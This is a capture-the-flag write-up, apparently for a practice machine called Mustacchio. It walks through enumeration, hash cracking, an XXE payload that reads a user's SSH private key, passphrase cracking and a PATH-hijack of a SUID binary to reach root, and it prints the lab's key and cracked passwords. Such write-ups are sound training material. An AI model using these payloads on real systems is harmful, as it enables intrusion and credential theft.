Target: 10.10.190.113

## Enumeration:

nmap
```
$ sudo nmap -sC -sV 10.10.190.113 -p-

Nmap scan report for 10.10.190.113
Host is up (0.40s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

ffuf
```
$ ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.190.113/FUZZ

images                  [Status: 301, Size: 315, Words: 20, Lines: 10]
custom                  [Status: 301, Size: 315, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]
```

checking index

![index](mustacchio1.png)

checking custom/js/

![/custom/js/](mustacchio2.png)

checking users.bak
```
$ strings users.bak   

SQLite format 3
tableusersusers
CREATE TABLE users(username text NOT NULL, password text NOT NULL)
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

cracking hash
```
$ hashcat -m 100 -a 0 -o crack.txt hash.txt /usr/share/wordlists/rockyou.txt 

$ cat crack.txt        

1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19
```

logging in 10.10.190.113:8765

![10.10.190.113:8765](mustacchio3.png)

successfull login

![home.php](mustacchio4.png)

viewing src

![src:home.php](mustacchio5.png)

checking http://10.10.190.113:8765/auth/dontforget.bak
```
$ curl http://10.10.190.113:8765/auth/dontforget.bak
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>   
```

### Findings:Looking for attack vectors

Use XML External Entity (XXE) to get the private key then gain access using found credential.


## Foothold:

[Exploiting XXE to retrieve files](https://portswigger.net/web-security/xxe)

XXE to retrieve ssh key
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>   
```

viewing src:XXE

![src:XXE](mustacchio6.png)
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

cracking passphrase
```
$ python ssh2john.py barry_key > hash

$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

urieljames       (barry_key)
```

```
$ chmod 600 barry_key 

$ ssh barry@10.10.190.113 -i barry_key

barry@mustacchio:~$ id

uid=1003(barry) gid=1003(barry) groups=1003(barry)
```

```
cat user.txt

<redacted>
```


## Priv Escalations:

enumerating suid permissions
```
barry@mustacchio:~$ find / -perm -u=s -type f 2> /dev/null

/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```

looking for what the file does
```
barry@mustacchio:/home$ cd joe

barry@mustacchio:/home/joe$ ls -la

total 28
drwxr-xr-x 2 joe  joe   4096 Jun 12 15:48 .
drwxr-xr-x 4 root root  4096 Jun 12 15:48 ..
-rwsr-xr-x 1 root root 16832 Jun 12 15:48 live_log

barry@mustacchio:/home/joe$ file live_log 

live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped

barry@mustacchio:/home/joe$ strings live_log 

/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
<snip>
```

live_log bin basically prints the last 10 entries (execute tail) on /var/log/nginx/access.log. Notice that tail is not using an absolute path.  

[Privilege Escalation using Path Variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

exploiting using path variable
```
barry@mustacchio:/home/joe$ cd /dev/shm

barry@mustacchio:/dev/shm$ echo "/bin/bash" > tail

barry@mustacchio:/dev/shm$ chmod 777 tail

barry@mustacchio:/dev/shm$ echo $PATH

barry@mustacchio:/dev/shm$ export PATH=/dev/shm:$PATH

barry@mustacchio:/dev/shm$ cd /home/joe

barry@mustacchio:/home/joe$ ./live_log
```

```
root@mustacchio:/home/joe# id

uid=0(root) gid=0(root) groups=0(root),1003(barry)
```

```
root@mustacchio:/home/joe# cat /root/root.txt 

<redacted>
```
